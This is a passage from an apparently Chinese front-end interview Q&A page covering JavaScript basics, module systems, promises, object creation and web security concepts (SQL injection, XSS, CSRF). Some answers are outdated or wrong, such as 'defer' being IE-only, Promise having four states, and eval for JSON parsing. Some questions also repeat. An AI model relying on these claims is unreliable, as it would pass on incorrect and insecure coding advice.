class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">　　　　　　<span class="comment">//...</span></span><br><span class="line">　　　　&#125;;</span><br><span class="line">　　　　<span class="keyword">return</span> &#123;</span><br><span class="line">　　　　　　m1 : m1,</span><br><span class="line">　　　　　　m2 : m2</span><br><span class="line">　　　　&#125;;</span><br><span class="line">　　&#125;)();</span><br></pre></td></tr></table></figure>
<h3 id="12-异步加载js的方式有哪些"><a class="markdownIt-Anchor" href="#12-异步加载js的方式有哪些"></a> 12、异步加载JS的方式有哪些？</h3>
<ul>
<li>defer，只支持<code>IE</code></li>
<li><code>async</code>：</li>
<li>创建<code>script</code>，插入到<code>DOM</code>中，加载完毕后<code>callBack</code></li>
</ul>
<h3 id="13-那些操作会造成内存泄漏"><a class="markdownIt-Anchor" href="#13-那些操作会造成内存泄漏"></a> 13、那些操作会造成内存泄漏？</h3>
<ul>
<li>内存泄漏指任何对象在您不再拥有或需要它之后仍然存在</li>
<li><code>setTimeout</code> 的第一个参数使用字符串而非函数的话，会引发内存泄漏</li>
<li>闭包使用不当</li>
</ul>
<h3 id="14-xml和json的区别"><a class="markdownIt-Anchor" href="#14-xml和json的区别"></a> 14、XML和JSON的区别？</h3>
<ul>
<li>
<p>数据体积方面</p>
<ul>
<li><code>JSON</code>相对<code>于XML</code>来讲，数据的体积小，传递的速度更快些。</li>
</ul>
</li>
<li>
<p>数据交互方面</p>
<ul>
<li><code>JSON</code>与<code>JavaScript</code>的交互更加方便，更容易解析处理，更好的数据交互</li>
</ul>
</li>
<li>
<p>数据描述方面</p>
<ul>
<li><code>JSON</code>对数据的描述性比<code>XML</code>较差</li>
</ul>
</li>
<li>
<p>传输速度方面</p>
<ul>
<li><code>JSON</code>的速度要远远快于<code>XML</code></li>
</ul>
</li>
</ul>
<h3 id="15-谈谈你对webpack的看法"><a class="markdownIt-Anchor" href="#15-谈谈你对webpack的看法"></a> 15、谈谈你对webpack的看法</h3>
<ul>
<li><code>WebPack</code> 是一个模块打包工具，你可以使用<code>WebPack</code>管理你的模块依赖，并编绎输出模块们所需的静态文件。它能够很好地管理、打包<code>Web</code>开发中所用到的<code>HTML</code>、<code>Javascript</code>、<code>CSS</code>以及各种静态文件（图片、字体等），让开发过程更加高效。对于不同类型的资源，<code>webpack</code>有对应的模块加载器。<code>webpack</code>模块打包器会分析模块间的依赖关系，最后 生成了优化且合并后的静态资源</li>
</ul>
<h3 id="16-说说你对amd和commonjs的理解"><a class="markdownIt-Anchor" href="#16-说说你对amd和commonjs的理解"></a> 16、说说你对AMD和Commonjs的理解</h3>
<ul>
<li><code>CommonJS</code>是服务器端模块的规范，<code>Node.js</code>采用了这个规范。<code>CommonJS</code>规范加载模块是同步的，也就是说，只有加载完成，才能执行后面的操作。<code>AMD</code>规范则是非同步加载模块，允许指定回调函数</li>
<li><code>AMD</code>推荐的风格通过返回一个对象做为模块对象，<code>CommonJS</code>的风格通过对<code>module.exports</code>或<code>exports</code>的属性赋值来达到暴露模块对象的目的</li>
</ul>
<h3 id="17-常见web安全及防护原理"><a class="markdownIt-Anchor" href="#17-常见web安全及防护原理"></a> 17、常见web安全及防护原理</h3>
<ul>
<li>
<p><code>sql</code>注入原理</p>
<ul>
<li>就是通过把<code>SQL</code>命令插入到<code>Web</code>表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令</li>
</ul>
</li>
<li>
<p>总的来说有以下几点</p>
<ul>
<li>永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对单引号和双<code>&quot;-&quot;</code>进行转换等</li>
<li>永远不要使用动态拼装SQL，可以使用参数化的<code>SQL</code>或者直接使用存储过程进行数据查询存取</li>
<li>永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接</li>
<li>不要把机密信息明文存放，请加密或者<code>hash</code>掉密码和敏感的信息</li>
</ul>
</li>
</ul>
<p><strong>XSS原理及防范</strong></p>
<ul>
<li><code>Xss(cross-site scripting)</code>攻击指的是攻击者往<code>Web</code>页面里插入恶意<code>html</code>标签或者<code>javascript</code>代码。比如：攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取<code>cookie</code>中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器中，而不是用户原本以为的信任站点</li>
</ul>
<p><strong>XSS防范方法</strong></p>
<ul>
<li>首先代码里对用户输入的地方和变量都需要仔细检查长度和对<code>”&lt;”,”&gt;”,”;”,”’”</code>等字符做过滤；其次任何内容写到页面之前都必须加以encode，避免不小心把<code>html tag</code> 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击</li>
</ul>
<p><strong>XSS与CSRF有什么区别吗？</strong></p>
<ul>
<li>
<p><code>XSS</code>是获取信息，不需要提前知道其他用户页面的代码和数据包。<code>CSRF</code>是代替用户完成指定的动作，需要知道其他用户页面的代码和数据包。要完成一次<code>CSRF</code>攻击，受害者必须依次完成两个步骤</p>
</li>
<li>
<p>登录受信任网站<code>A</code>，并在本地生成<code>Cookie</code></p>
</li>
<li>
<p>在不登出<code>A</code>的情况下，访问危险网站<code>B</code></p>
</li>
</ul>
<p><strong>CSRF的防御</strong></p>
<ul>
<li>服务端的<code>CSRF</code>方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数</li>
<li>通过验证码的方法</li>
</ul>
<h3 id="18-用过哪些设计模式"><a class="markdownIt-Anchor" href="#18-用过哪些设计模式"></a> 18、用过哪些设计模式？</h3>
<ul>
<li>
<p>工厂模式：</p>
<ul>
<li>工厂模式解决了重复实例化的问题，但还有一个问题,那就是识别问题，因为根本无法</li>
<li>主要好处就是可以消除对象间的耦合，通过使用工程方法而不是<code>new</code>关键字</li>
</ul>
</li>
<li>
<p>构造函数模式</p>
<ul>
<li>使用构造函数的方法，即解决了重复实例化的问题，又解决了对象识别的问题，该模式与工厂模式的不同之处在于</li>
<li>直接将属性和方法赋值给 <code>this</code>对象;</li>
</ul>
</li>
</ul>
<h3 id="19-为什么要有同源限制"><a class="markdownIt-Anchor" href="#19-为什么要有同源限制"></a> 19、为什么要有同源限制？</h3>
<ul>
<li>同源策略指的是：协议，域名，端口相同，同源策略是一种安全协议</li>
<li>举例说明：比如一个黑客程序，他利用<code>Iframe</code>把真正的银行登录页面嵌到他的页面上，当你使用真实的用户名，密码登录时，他的页面就可以通过<code>Javascript</code>读取到你的表单中<code>input</code>中的内容，这样用户名，密码就轻松到手了。</li>
</ul>
<h3 id="20-offsetwidthoffsetheightclientwidthclientheight与scrollwidthscrollheight的区别"><a class="markdownIt-Anchor" href="#20-offsetwidthoffsetheightclientwidthclientheight与scrollwidthscrollheight的区别"></a> 20、offsetWidth/offsetHeight,clientWidth/clientHeight与scrollWidth/scrollHeight的区别</h3>
<ul>
<li><code>offsetWidth/offsetHeight</code>返回值包含<strong>content + padding + border</strong>，效果与e.getBoundingClientRect()相同</li>
<li><code>clientWidth/clientHeight</code>返回值只包含<strong>content + padding</strong>，如果有滚动条，也<strong>不包含滚动条</strong></li>
<li><code>scrollWidth/scrollHeight</code>返回值包含<strong>content + padding + 溢出内容的尺寸</strong></li>
</ul>
<h3 id="21-javascript有哪些方法定义对象"><a class="markdownIt-Anchor" href="#21-javascript有哪些方法定义对象"></a> 21、javascript有哪些方法定义对象</h3>
<ul>
<li>对象字面量： <code>var obj = {};</code></li>
<li>构造函数： <code>var obj = new Object();</code></li>
<li>Object.create(): <code>var obj = Object.create(Object.prototype);</code></li>
</ul>
<h3 id="22-常见兼容性问题"><a class="markdownIt-Anchor" href="#22-常见兼容性问题"></a> 22、常见兼容性问题？</h3>
<ul>
<li><code>png24</code>位的图片在iE6浏览器上出现背景，解决方案是做成<code>PNG8</code></li>
<li>浏览器默认的<code>margin</code>和<code>padding</code>不同。解决方案是加一个全局的<code>*{margin:0;padding:0;}</code>来统一,，但是全局效率很低，一般是如下这样解决：</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span>,<span class="selector-tag">ul</span>,<span class="selector-tag">li</span>,<span class="selector-tag">ol</span>,<span class="selector-tag">dl</span>,<span class="selector-tag">dt</span>,<span class="selector-tag">dd</span>,<span class="selector-tag">form</span>,<span class="selector-tag">input</span>,<span class="selector-tag">h1</span>,<span class="selector-tag">h2</span>,<span class="selector-tag">h3</span>,<span class="selector-tag">h4</span>,<span class="selector-tag">h5</span>,<span class="selector-tag">h6</span>,<span class="selector-tag">p</span>&#123;</span><br><span class="line"><span class="attribute">margin</span>:<span class="number">0</span>;</span><br><span class="line"><span class="attribute">padding</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>IE</code>下,<code>event</code>对象有<code>x</code>,<code>y</code>属性,但是没有<code>pageX</code>,<code>pageY</code>属性</li>
<li><code>Firefox</code>下,<code>event</code>对象有<code>pageX</code>,<code>pageY</code>属性,但是没有<code>x,y</code>属性.</li>
</ul>
<h3 id="22-说说你对promise的了解"><a class="markdownIt-Anchor" href="#22-说说你对promise的了解"></a> 22、说说你对promise的了解</h3>
<ul>
<li>
<p>依照 <code>Promise/A+</code> 的定义，<code>Promise</code> 有四种状态：</p>
<ul>
<li>
<p><code>pending:</code> 初始状态, 非 <code>fulfilled</code> 或 <code>rejected.</code></p>
</li>
<li>
<p><code>fulfilled:</code> 成功的操作.</p>
</li>
<li>
<p><code>rejected:</code> 失败的操作.</p>
</li>
<li>
<p><code>settled: Promise</code>已被<code>fulfilled</code>或<code>rejected</code>，且不是<code>pending</code></p>
</li>
</ul>
</li>
<li>
<p>另外， <code>fulfilled</code>与 <code>rejected</code>一起合称 <code>settled</code></p>
</li>
<li>
<p><code>Promise</code> 对象用来进行延迟(<code>deferred</code>) 和异步(<code>asynchronous</code>) 计算</p>
</li>
</ul>
<p><strong>Promise 的构造函数</strong></p>
<ul>
<li>构造一个 <code>Promise</code>，最基本的用法如下：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (...) &#123;  <span class="comment">// succeed</span></span><br><span class="line"></span><br><span class="line">            resolve(result);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;   <span class="comment">// fails</span></span><br><span class="line"></span><br><span class="line">            reject(<span class="built_in">Error</span>(errMessage));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>Promise</code> 实例拥有 <code>then</code> 方法（具有 <code>then</code> 方法的对象，通常被称为<code>thenable</code>）。它的使用方法如下：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">promise.then(onFulfilled, onRejected)</span><br></pre></td></tr></table></figure>
<ul>
<li>接收两个函数作为参数，一个在 <code>fulfilled</code> 的时候被调用，一个在<code>rejected</code>的时候被调用，接收参数就是 <code>future</code>，<code>onFulfilled</code> 对应 <code>resolve</code>, <code>onRejected</code>对应 <code>reject</code></li>
</ul>
<h3 id="23-你觉得jquery源码有哪些写的好的地方"><a class="markdownIt-Anchor" href="#23-你觉得jquery源码有哪些写的好的地方"></a> 23、你觉得jQuery源码有哪些写的好的地方</h3>
<ul>
<li><code>jquery</code>源码封装在一个匿名函数的自执行环境中，有助于防止变量的全局污染，然后通过传入<code>window</code>对象参数，可以使<code>window</code>对象作为局部变量使用，好处是当<code>jquery</code>中访问<code>window</code>对象的时候，就不用将作用域链退回到顶层作用域了，从而可以更快的访问window对象。同样，传入<code>undefined</code>参数，可以缩短查找<code>undefined</code>时的作用域链</li>
<li><code>jquery</code>将一些原型属性和方法封装在了<code>jquery.prototype</code>中，为了缩短名称，又赋值给了<code>jquery.fn</code>，这是很形象的写法</li>
<li>有一些数组或对象的方法经常能使用到，<code>jQuery</code>将其保存为局部变量以提高访问速度</li>
<li><code>jquery</code>实现的链式调用可以节约代码，所返回的都是同一个对象，可以提高代码效率</li>
</ul>
<h3 id="24-vue-react-angular"><a class="markdownIt-Anchor" href="#24-vue-react-angular"></a> 24、vue、react、angular</h3>
<ul>
<li>
<p><code>Vue.js</code><br />
一个用于创建 <code>web</code> 交互界面的库，是一个精简的 <code>MVVM</code>。它通过双向数据绑定把 <code>View</code> 层和 <code>Model</code> 层连接了起来。实际的 <code>DOM</code> 封装和输出格式都被抽象为了<code>Directives</code> 和 <code>Filters</code></p>
</li>
<li>
<p><code>AngularJS</code><br />
是一个比较完善的前端<code>MVVM</code>框架，包含模板，数据双向绑定，路由，模块化，服务，依赖注入等所有功能，模板功能强大丰富，自带了丰富的 <code>Angular</code>指令</p>
</li>
<li>
<p><code>react</code><br />
<code>React</code> 仅仅是 <code>VIEW</code> 层是<code>facebook</code>公司。推出的一个用于构建<code>UI</code>的一个库，能够实现服务器端的渲染。用了<code>virtual dom</code>，所以性能很好。</p>
</li>
</ul>
<h3 id="25-node的应用场景"><a class="markdownIt-Anchor" href="#25-node的应用场景"></a> 25、Node的应用场景</h3>
<ul>
<li>
<p>特点：</p>
<ul>
<li>1、它是一个<code>Javascript</code>运行环境</li>
<li>2、依赖于<code>Chrome V8</code>引擎进行代码解释</li>
<li>3、事件驱动</li>
<li>4、非阻塞<code>I/O</code></li>
<li>5、单进程，单线程</li>
</ul>
</li>
<li>
<p>优点：</p>
<ul>
<li>高并发（最重要的优点）</li>
</ul>
</li>
<li>
<p>缺点：</p>
<ul>
<li>1、只支持单<code>核CPU</code>，不能充分利用<code>CPU</code></li>
<li>2、可靠性低，一旦代码某个环节崩溃，整个系统都崩溃</li>
</ul>
</li>
</ul>
<h3 id="26-谈谈你对amd-cmd的理解"><a class="markdownIt-Anchor" href="#26-谈谈你对amd-cmd的理解"></a> 26、谈谈你对AMD、CMD的理解</h3>
<ul>
<li>
<p><code>CommonJS</code>是服务器端模块的规范，<code>Node.js</code>采用了这个规范。<code>CommonJS</code>规范加载模块是同步的，也就是说，只有加载完成，才能执行后面的操作。<code>AMD</code>规范则是非同步加载模块，允许指定回调函数</p>
</li>
<li>
<p><code>AMD</code>推荐的风格通过返回一个对象做为模块对象，<code>CommonJS</code>的风格通过对<code>module.exports</code>或<code>exports</code>的属性赋值来达到暴露模块对象的目的</p>
</li>
</ul>
<h3 id="27-那些操作会造成内存泄漏"><a class="markdownIt-Anchor" href="#27-那些操作会造成内存泄漏"></a> 27、那些操作会造成内存泄漏？</h3>
<ul>
<li>内存泄漏指任何对象在您不再拥有或需要它之后仍然存在</li>
<li><code>setTimeout</code> 的第一个参数使用字符串而非函数的话，会引发内存泄漏</li>
<li>闭包、控制台日志、循环（在两个对象彼此引用且彼此保留时，就会产生一个循环）</li>
</ul>
<h3 id="28-web开发中会话跟踪的方法有哪些"><a class="markdownIt-Anchor" href="#28-web开发中会话跟踪的方法有哪些"></a> 28、web开发中会话跟踪的方法有哪些</h3>
<ul>
<li><code>cookie</code></li>
<li><code>session</code></li>
<li><code>url</code>重写</li>
<li>隐藏<code>input</code></li>
<li><code>ip</code>地址</li>
</ul>
<h3 id="29-介绍js的基本数据类型"><a class="markdownIt-Anchor" href="#29-介绍js的基本数据类型"></a> 29、介绍js的基本数据类型</h3>
<ul>
<li><code>Undefined</code>、<code>Null</code>、<code>Boolean</code>、<code>Number</code>、<code>String</code></li>
</ul>
<h3 id="30-介绍js有哪些内置对象"><a class="markdownIt-Anchor" href="#30-介绍js有哪些内置对象"></a> 30、介绍js有哪些内置对象？</h3>
<ul>
<li><code>Object</code> 是 <code>JavaScript</code> 中所有对象的父对象</li>
<li>数据封装类对象：<code>Object</code>、<code>Array</code>、<code>Boolean</code>、<code>Number</code> 和 <code>String</code></li>
<li>其他对象：<code>Function</code>、<code>Arguments</code>、<code>Math</code>、<code>Date</code>、<code>RegExp</code>、<code>Error</code></li>
</ul>
<h3 id="31-说几条写javascript的基本规范"><a class="markdownIt-Anchor" href="#31-说几条写javascript的基本规范"></a> 31、说几条写JavaScript的基本规范？</h3>
<ul>
<li>不要在同一行声明多个变量</li>
<li>请使用 <code>===/!==</code> 来比较 <code>true/false</code> 或者数值</li>
<li>使用对象字面量替代 <code>new Array</code> 这种形式</li>
<li>不要使用全局函数</li>
<li><code>Switch</code> 语句必须带有 <code>default</code> 分支</li>
<li><code>If</code> 语句必须使用大括号</li>
<li><code>for-in</code> 循环中的变量 应该使用 <code>var</code> 关键字明确限定作用域，从而避免作用域污</li>
</ul>
<h3 id="32-javascript有几种类型的值你能画一下他们的内存图吗"><a class="markdownIt-Anchor" href="#32-javascript有几种类型的值你能画一下他们的内存图吗"></a> 32、JavaScript有几种类型的值？，你能画一下他们的内存图吗？</h3>
<ul>
<li>栈：原始数据类型（<code>Undefined</code>，<code>Null</code>，<code>Boolean</code>，<code>Numbe</code>r、<code>String</code>）</li>
<li>堆：引用数据类型（对象、数组和函数）</li>
<li>两种类型的区别是：存储位置不同；</li>
<li>原始数据类型直接存储在栈(<code>stack</code>)中的简单数据段，占据空间小、大小固定，属于被频繁使用数据，所以放入栈中存储；</li>
<li>引用数据类型存储在堆(<code>heap</code>)中的对象,占据空间大、大小不固定,如果存储在栈中，将会影响程序运行的性能；引用数据类型在栈中存储了指针，该指针指向堆中该实体的起始地址。当解释器寻找引用值时，会首先检索其</li>
<li>在栈中的地址，取得地址后从堆中获得实体</li>
</ul>
<p><img src="https://camo.githubusercontent.com/d1947e624a0444d1032a85800013df487adc5550/687474703a2f2f7777772e77337363686f6f6c2e636f6d2e636e2f692f63745f6a735f76616c75652e676966" alt="" /></p>
<h3 id="33-javascript创建对象的几种方式"><a class="markdownIt-Anchor" href="#33-javascript创建对象的几种方式"></a> 33、javascript创建对象的几种方式？</h3>
<blockquote>
<p><code>javascript</code>创建对象简单的说,无非就是使用内置对象或各种自定义对象，当然还可以用<code>JSON</code>；但写法有很多种，也能混合使用</p>
</blockquote>
<ul>
<li>对象字面量的方式</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">person=&#123;<span class="attr">firstname</span>:<span class="string">"Mark"</span>,<span class="attr">lastname</span>:<span class="string">"Yun"</span>,<span class="attr">age</span>:<span class="number">25</span>,<span class="attr">eyecolor</span>:<span class="string">"black"</span>&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>用<code>function</code>来模拟无参的构造函数</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">var</span> person=<span class="keyword">new</span> Person();<span class="comment">//定义一个function，如果使用new"实例化",该function可以看作是一个Class</span></span><br><span class="line">        person.name=<span class="string">"Mark"</span>;</span><br><span class="line">        person.age=<span class="string">"25"</span>;</span><br><span class="line">        person.work=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(person.name+<span class="string">" hello..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">person.work();</span><br></pre></td></tr></table></figure>
<ul>
<li>用<code>function</code>来模拟参构造函数来实现（用<code>this</code>关键字定义构造的上下文属性）</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Pet</span>(<span class="params">name,age,hobby</span>)</span>&#123;</span><br><span class="line">       <span class="keyword">this</span>.name=name;<span class="comment">//this作用域：当前对象</span></span><br><span class="line">       <span class="keyword">this</span>.age=age;</span><br><span class="line">       <span class="keyword">this</span>.hobby=hobby;</span><br><span class="line">       <span class="keyword">this</span>.eat=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          alert(<span class="string">"我叫"</span>+<span class="keyword">this</span>.name+<span class="string">",我喜欢"</span>+<span class="keyword">this</span>.hobby+<span class="string">",是个程序员"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> maidou =<span class="keyword">new</span> Pet(<span class="string">"麦兜"</span>,<span class="number">25</span>,<span class="string">"coding"</span>);<span class="comment">//实例化、创建对象</span></span><br><span class="line">    maidou.eat();<span class="comment">//调用eat方法</span></span><br></pre></td></tr></table></figure>
<ul>
<li>用工厂方式来创建（内置对象）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var wcDog &#x3D;new Object();</span><br><span class="line">     wcDog.name&#x3D;&quot;旺财&quot;;</span><br><span class="line">     wcDog.age&#x3D;3;</span><br><span class="line">     wcDog.work&#x3D;function()&#123;</span><br><span class="line">       alert(&quot;我是&quot;+wcDog.name+&quot;,汪汪汪......&quot;);</span><br><span class="line">     &#125;</span><br><span class="line">     wcDog.work();</span><br></pre></td></tr></table></figure>
<ul>
<li>用原型方式来创建</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Dog()&#123;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">     Dog.prototype.name&#x3D;&quot;旺财&quot;;</span><br><span class="line">     Dog.prototype.eat&#x3D;function()&#123;</span><br><span class="line">     alert(this.name+&quot;是个吃货&quot;);</span><br><span class="line">     &#125;</span><br><span class="line">     var wangcai &#x3D;new Dog();</span><br><span class="line">     wangcai.eat();</span><br></pre></td></tr></table></figure>
<ul>
<li>用混合方式来创建</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Car(name,price)&#123;</span><br><span class="line">     this.name&#x3D;name;</span><br><span class="line">     this.price&#x3D;price; </span><br><span class="line">   &#125;</span><br><span class="line">    Car.prototype.sell&#x3D;function()&#123;</span><br><span class="line">      alert(&quot;我是&quot;+this.name+&quot;，我现在卖&quot;+this.price+&quot;万元&quot;);</span><br><span class="line">     &#125;</span><br><span class="line">   var camry &#x3D;new Car(&quot;凯美瑞&quot;,27);</span><br><span class="line">   camry.sell();</span><br></pre></td></tr></table></figure>
<h3 id="34-eval是做什么的"><a class="markdownIt-Anchor" href="#34-eval是做什么的"></a> 34、eval是做什么的？</h3>
<ul>
<li>它的功能是把对应的字符串解析成<code>JS</code>代码并运行</li>
<li>应该避免使用<code>eval</code>，不安全，非常耗性能（<code>2</code>次，一次解析成<code>js</code>语句，一次执行）</li>
<li>由<code>JSON</code>字符串转换为JSON对象的时候可以用<code>eval，var obj =eval('('+ str +')')</code></li>
</ul>
<h3 id="35-nullundefined-的区别"><a class="markdownIt-Anchor" href="#35-nullundefined-的区别"></a> 35、null，undefined 的区别？</h3>
<ul>
<li>
<p><code>undefined</code>   表示不存在这个值。</p>
</li>
<li>
<p><code>undefined</code> :是一个表示&quot;无&quot;的原始值或者说表示&quot;缺少值&quot;，就是此处应该有一个值，但是还没有定义。当尝试读取时会返回 <code>undefined</code></p>
</li>
<li>
<p>例如变量被声明了，但没有赋值时，就等于<code>undefined</code></p>
</li>
<li>
<p><code>null</code> 表示一个对象被定义了，值为“空值”</p>
</li>
<li>
<p><code>null</code> : 是一个对象(空对象, 没有任何属性和方法)</p>
</li>
<li>
<p>例如作为函数的参数，表示该函数的参数不是对象；</p>
</li>
<li>
<p>在验证<code>null</code>时，一定要使用　<code>===</code> ，因为 <code>==</code>无法分别 <code>null</code> 和　<code>undefined</code></p>
</li>
</ul>
<h3 id="36-1-2-3mapparseint-答案是多少"><a class="markdownIt-Anchor" href="#36-1-2-3mapparseint-答案是多少"></a> 36、[“1”, “2”, “3”].map(parseInt) 答案是多少？</h3>
<ul>
<li><code>[1, NaN, NaN]</code>因为 <code>parseInt</code> 需要两个参数 <code>(val, radix)</code>，其中 <code>radix</code> 表示解析时用的基数。</li>
<li><code>map</code> 传了 <code>3</code> 个 <code>(element, index, array)</code>，对应的 <code>radix</code> 不合法导致解析失败。</li>
</ul>
<h3 id="37-javascript-代码中的use-strict是什么意思-使用它区别是什么"><a class="markdownIt-Anchor" href="#37-javascript-代码中的use-strict是什么意思-使用它区别是什么"></a> 37、javascript 代码中的&quot;use strict&quot;;是什么意思 ? 使用它区别是什么？</h3>
<ul>
<li><code>use strict</code>是一种<code>ECMAscript 5</code> 添加的（严格）运行模式,这种模式使得 Javascript 在更严格的条件下运行,使<code>JS</code>编码更加规范化的模式,消除<code>Javascript</code>语法的一些不合理、不严谨之处，减少一些怪异行为</li>
</ul>
<h3 id="38-json-的了解"><a class="markdownIt-Anchor" href="#38-json-的了解"></a> 38、JSON 的了解？**</h3>
<ul>
<li>
<p><code>JSON(JavaScript Object Notation)</code> 是一种轻量级的数据交换格式</p>
</li>
<li>
<p>它是基于<code>JavaScript</code>的一个子集。数据格式简单, 易于读写, 占用带宽小</p>
</li>
<li>
<p><code>JSON</code>字符串转换为JSON对象:</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var obj &#x3D;eval(&#39;(&#39;+ str +&#39;)&#39;);</span><br><span class="line">var obj &#x3D; str.parseJSON();</span><br><span class="line">var obj &#x3D; JSON.parse(str);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>JSON</code>对象转换为JSON字符串：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var last&#x3D;obj.toJSONString();</span><br><span class="line">var last&#x3D;JSON.stringify(obj);</span><br></pre></td></tr></table></figure>
<h3 id="39-js延迟加载的方式有哪些"><a class="markdownIt-Anchor" href="#39-js延迟加载的方式有哪些"></a> 39、js延迟加载的方式有哪些？</h3>
<ul>
<li><code>defer</code>和<code>async</code>、动态创建<code>DOM</code>方式（用得最多）、按需异步载入<code>js</code></li>
</ul>
<h3 id="40-同步和异步的区别"><a class="markdownIt-Anchor" href="#40-同步和异步的区别"></a> 40、同步和异步的区别?</h3>
<ul>
<li>同步：浏览器访问服务器请求，用户看得到页面刷新，重新发请求,等请求完，页面刷新，新内容出现，用户看到新内容,进行下一步操作</li>
<li>异步：浏览器访问服务器请求，用户正常操作，浏览器后端进行请求。等请求完，页面不刷新，新内容也会出现，用户看到新内容</li>
</ul>
<h3 id="41-渐进增强和优雅降级"><a class="markdownIt-Anchor" href="#41-渐进增强和优雅降级"></a> 41、渐进增强和优雅降级</h3>
<ul>
<li>
<p>渐进增强 ：针对低版本浏览器进行构建页面，保证最基本的功能，然后再针对高级浏览器进行效果、交互等改进和追加功能达到更好的用户体验。</p>
</li>
<li>
<p>优雅降级 ：一开始就构建完整的功能，然后再针对低版本浏览器进行兼容</p>
</li>
</ul>
<h3 id="42-defer和async"><a class="markdownIt-Anchor" href="#42-defer和async"></a> 42、defer和async</h3>
<ul>
<li><code>defer</code>并行加载<code>js</code>文件，会按照页面上<code>script</code>标签的顺序执行</li>
<li><code>async</code>并行加载<code>js</code>文件，下载完成立即执行，不会按照页面上<code>script</code>标签的顺序执行</li>
</ul>
<h3 id="43-说说严格模式的限制"><a class="markdownIt-Anchor" href="#43-说说严格模式的限制"></a> 43、说说严格模式的限制</h3>
<ul>
<li>变量必须声明后再使用</li>
<li>函数的参数不能有同名属性，否则报错</li>
<li>不能使用<code>with</code>语句</li>
<li>禁止<code>this</code>指向全局对象</li>
</ul>
<h3 id="44-attribute和property的区别是什么"><a class="markdownIt-Anchor" href="#44-attribute和property的区别是什么"></a> 44、attribute和property的区别是什么？</h3>
<ul>
<li><code>attribute</code>是<code>dom</code>元素在文档中作为<code>html</code>标签拥有的属性；</li>
<li><code>property</code>就是<code>dom</code>元素在<code>js</code>中作为对象拥有的属性。</li>
<li>对于<code>html</code>的标准属性来说，<code>attribute</code>和<code>property</code>是同步的，是会自动更新的</li>
<li>但是对于自定义的属性来说，他们是不同步的</li>
</ul>
<h3 id="45-谈谈你对es6的理解"><a class="markdownIt-Anchor" href="#45-谈谈你对es6的理解"></a> 45、谈谈你对ES6的理解</h3>
<ul>
<li>新增模板字符串（为<code>JavaScript</code>提供了简单的字符串插值功能）</li>
<li>箭头函数</li>
<li><code>for-of</code>（用来遍历数据—例如数组中的值。）</li>
<li><code>arguments</code>对象可被不定参数和默认参数完美代替。</li>
<li><code>ES6</code>将p<code>romise</code>对象纳入规范，提供了原生的<code>Promise</code>对象。</li>
<li>增加了<code>let</code>和<code>const</code>命令，用来声明变量。</li>
<li>增加了块级作用域。</li>
<li><code>let</code>命令实际上就增加了块级作用域。</li>
<li>还有就是引入<code>module</code>模块的概念</li>
</ul>
<h3 id="46-ecmascript6-怎么写class么为什么会出现class这种东西"><a class="markdownIt-Anchor" href="#46-ecmascript6-怎么写class么为什么会出现class这种东西"></a> 46、ECMAScript6 怎么写class么，为什么会出现class这种东西?</h3>
<ul>
<li>这个语法糖可以让有<code>OOP</code>基础的人更快上手<code>js</code>，至少是一个官方的实现了</li>
<li>但对熟悉<code>js</code>的人来说，这个东西没啥大影响；一个<code>Object.creat()</code>搞定继承，比<code>class</code>简洁清晰的多</li>
</ul>
<h3 id="47-什么是面向对象编程及面向过程编程它们的异同和优缺点"><a class="markdownIt-Anchor" href="#47-什么是面向对象编程及面向过程编程它们的异同和优缺点"></a> 47、什么是面向对象编程及面向过程编程，它们的异同和优缺点</h3>
<ul>
<li>面向过程就是分析出解决问题所需要的步骤，然后用函数把这些步骤一步一步实现，使用的时候一个一个依次调用就可以了</li>
<li>面向对象是把构成问题事务分解成各个对象，建立对象的目的不是为了完成一个步骤，而是为了描叙某个事物在整个解决问题的步骤中的行为</li>
<li>面向对象是以功能来划分问题，而不是步骤</li>
</ul>
<h3 id="48-面向对象编程思想"><a class="markdownIt-Anchor" href="#48-面向对象编程思想"></a> 48、面向对象编程思想</h3>
<ul>
